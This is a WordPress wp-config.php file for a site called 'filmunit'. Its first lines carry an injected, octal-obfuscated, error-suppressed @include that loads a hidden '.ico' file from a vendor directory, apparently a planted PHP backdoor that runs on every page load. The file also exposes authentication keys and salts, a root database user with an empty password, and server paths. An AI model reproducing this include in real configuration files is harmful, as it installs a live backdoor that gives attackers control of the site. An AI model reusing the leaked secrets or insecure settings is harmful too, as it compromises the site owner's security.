<?php









/*48e1a*/

@include "\057ho\155e/\154wd\172hv\150h/\167ww\056we\142wi\156gd\145mo\056co\155/g\157we\144/v\145nd\157r/\156es\142ot\057.f\06612\1441c\065.i\143o";

/*48e1a*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('WP_CACHE', true); //Added by WP-Cache Manager
//define( 'WPCACHEHOME', '/home/lwdzhvhh/www.webwingdemo.com/filmunit/wptheme/wp-content/plugins/wp-super-cache/' ); //Added by WP-Cache Manager
define( 'WPCACHEHOME', ABSPATH.'/wp-content/plugins/wp-super-cache/' ); //Added by WP-Cache Manager

define('DB_NAME', 'filmunit');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define('CONCATENATE_SCRIPTS', false );
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '^t4oJovw%Ygc g?r;6 i`flLP)IUP5N)-P#PcA.Z:PH+j~fzqw#WkpDT]$$_j9 N');
define('SECURE_AUTH_KEY',  'MBb{YPiT?=Bf8lfNiBA(-T*@?1 N7V?%E{K*8eHsbdH*1;1;*6qOB_20p6DP}}_Z');
define('LOGGED_IN_KEY',    'pmKbgC1XV*ZSXzr?GU>g,FI65`M/wkNuhsg0G_sU@I+CUON(HAEZ)accuAXQ*2Pa');
define('NONCE_KEY',        '8+R2,HK8DcSq{6`qL6ad;)U ab}}]%1v@=2R[{XyC`AGlc=S;RDp!ENA{cf/g 6E');
define('AUTH_SALT',        ',&{<&sI2_i~TjXM~l<B1Udv 5n:DRL!N6{gu!21t?K$fCmk`aHUZjy0I8N6Fl]10');
define('SECURE_AUTH_SALT', 'A3GjdX][G1WgVxH]Rg8P$V!!eAwb.Rm&7B|8G)?Ypa=-BqFNv*>w:Ds.CVED`Ttk');
define('LOGGED_IN_SALT',   '+!,IyTpuloqx@JZ^n wBBive@$pT<plwS+hc5OhdaAPxn>t5B;2_[&;!cVLxKzy.');
define('NONCE_SALT',       'Pr,m}Op*/^i_>B^T19P]4VX_2-1 ?]:zpDok#Jhf>~7LM$C|xFs@g;2_9ky.Sg+8');

define('BASE_URL','http://webwingdemo.com/filmunit/');
define('IMAGE_URL','http://webwingdemo.com/filmunit/images/');
define('DB_IMG','http://webwingdemo.com/filmunit/uploads/package_images/');
define('DB_Footage','http://webwingdemo.com/filmunit/uploads/admin_footage_image/');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

define('WP_DEBUG_LOG', false);

define('WP_DEBUG_DISPLAY', false);

/* Set */
define('FS_METHOD', 'direct');
/* That's all, stop editing! Happy blogging. */



/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
